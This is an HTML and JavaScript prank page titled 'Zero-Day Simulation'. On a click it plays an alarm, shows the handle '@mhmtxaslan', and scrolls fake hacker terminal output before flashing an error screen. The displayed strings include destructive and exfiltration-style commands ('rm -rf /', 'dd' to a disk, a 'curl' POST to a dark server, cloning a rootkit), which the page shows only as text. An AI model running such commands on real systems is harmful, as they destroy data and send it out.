<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Zero-Day Simulation</title>
  <style>
    body {
      margin:0; padding:0;
      background:black; color:#0f0;
      font-family:monospace;
      overflow:hidden;
    }
    #startBtn {
      position:fixed;
      top:50%; left:50%;
      transform:translate(-50%,-50%);
      width:80px; height:80px;
      font-size:48px;
      color:red;
      border:3px solid red;
      background:black;
      border-radius:50%;
      cursor:pointer;
      z-index:1000;
      user-select:none;
    }
    #mhmtBox {
      position:fixed;
      top:50%; left:50%;
      transform:translate(-50%,-50%);
      font-size:32px;
      color:#0f0;
      border:2px solid #0f0;
      padding:20px 40px;
      display:none;
      animation:blink 1s infinite;
      z-index:999;
      user-select:none;
    }
    @keyframes blink {
      0%, 100% {opacity: 1;}
      50% {opacity: 0.3;}
    }
    .terminal {
      position:absolute;
      width:90%;
      height:40%;
      padding:10px;
      overflow:hidden;
      background:black;
      border:2px solid white;
      font-size:16px;
      white-space:pre-wrap;
      display:none;
      box-sizing:border-box;
    }
    #topTerm {top:0; left:5%; color:white;}
    #bottomTerm {bottom:0; left:5%; color:#0f0;}
    #errorScreen {
      display:none;
      position:fixed;
      top:50%; left:50%;
      transform:translate(-50%,-50%);
      font-size:48px;
      color:red;
      animation:flash 0.5s infinite alternate;
      z-index:9999;
      user-select:none;
    }
    @keyframes flash {
      0% {opacity: 1;}
      100% {opacity: 0;}
    }
    .excl {
      position:absolute;
      color:red;
      font-size:32px;
      animation:flash 0.3s infinite;
      z-index:9999;
      user-select:none;
    }
  </style>
</head>
<body>

<button id="startBtn">X</button>
<div id="mhmtBox">@mhmtxaslan</div>
<div id="topTerm" class="terminal"></div>
<div id="bottomTerm" class="terminal"></div>
<div id="errorScreen">!!! ERROR !!!</div>
<audio id="alarm" loop>
  <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg" />
</audio>

<script>
  const startBtn = document.getElementById("startBtn");
  const mhmtBox = document.getElementById("mhmtBox");
  const topTerm = document.getElementById("topTerm");
  const bottomTerm = document.getElementById("bottomTerm");
  const errorScreen = document.getElementById("errorScreen");
  const alarm = document.getElementById("alarm");

  const commands = [
    "curl -X POST http://darkserver/upload",
    "LongLongEarth.exe --deep-scan",
    "sudo rm -rf / --no-preserve-root",
    "ping 127.0.0.1 -t",
    "nmap -sS 192.168.1.0/24",
    "tracert 10.0.0.1",
    "inject payload into memory",
    "git clone http://evil.git/rootkit",
    "dd if=/dev/random of=/dev/sda",
    "echo HACKED > C:\\system32\\boot.ini"
  ];

  startBtn.onclick = async () => {
    try {
      await alarm.play();  // Kullanıcı tıklamasıyla ses oynatmayı başlat

      // Ses erişimi sağlandı, butonu gizle ve efektleri başlat
      startBtn.style.display = "none";
      mhmtBox.style.display = "block";

      // 3. saniyede renk kırmızı oluyor
      setTimeout(() => {
        mhmtBox.style.color = "red";
        mhmtBox.style.borderColor = "red";
      }, 3000);

      // 5. saniyede kutu kayboluyor ve terminaller başlıyor
      setTimeout(() => {
        mhmtBox.style.display = "none";
        topTerm.style.display = "block";
        bottomTerm.style.display = "block";
        startTerminals();
      }, 5000);

      // 30. saniyede ERROR ekranı ve ünlemler
      setTimeout(() => {
        errorScreen.style.display = "block";
        spawnExclamations(40);
      }, 30000);

    } catch (err) {
      alert("Tarayıcınız ses oynatmayı engelliyor ya da izin vermediniz.");
      console.error(err);
    }
  };

  function startTerminals() {
    let count = 0;
    const maxLines = 40;

    const terminalInterval = setInterval(() => {
      const cmd = commands[Math.floor(Math.random()*commands.length)];
      const color = count > 20 ? "red" : "#0f0";

      topTerm.innerHTML += `<div style="color:white;">${cmd}</div>`;
      bottomTerm.innerHTML += `<div style="color:${color};">${cmd}</div>`;

      topTerm.scrollTop = topTerm.scrollHeight;
      bottomTerm.scrollTop = bottomTerm.scrollHeight;

      count++;
      if (count >= maxLines) {
        clearInterval(terminalInterval);
      }
    }, 100);
  }

  function spawnExclamations(num) {
    for (let i = 0; i < num; i++) {
      const excl = document.createElement("div");
      excl.classList.add("excl");
      excl.textContent = "!";
      excl.style.top = Math.random() * 100 + "vh";
      excl.style.left = Math.random() * 100 + "vw";
      document.body.appendChild(excl);
    }
  }
</script>

</body>
</html>
